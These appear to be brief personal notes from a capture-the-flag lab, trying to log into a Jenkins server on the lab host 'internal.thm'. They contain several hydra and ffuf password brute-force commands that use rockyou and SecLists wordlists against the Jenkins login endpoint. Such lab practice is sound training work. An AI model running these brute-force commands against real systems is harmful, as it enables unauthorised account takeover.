
The default user credentials are admin and password.
https://docs.redhat.com/en/documentation/openshift_container_platform/3.3/html/using_images/other-images#initializing-jenkins

This does not work. None of the other passwords on account we have work.

```sh
hydra -V -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```
I don't think this works

```sh
ffuf -request request -request-proto http -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt
```

```sh
ffuf -s -w /usr/share/wordlists/rockyou.txt:PASS -u http://localhost:9000/j_acegi_security_check -d "username=admin&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid username or password"
```

```sh
hydra -V -l admin -P /usr/share/wordlists/rockyou.txt localhost:9000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError"
```

got it with burp but test more

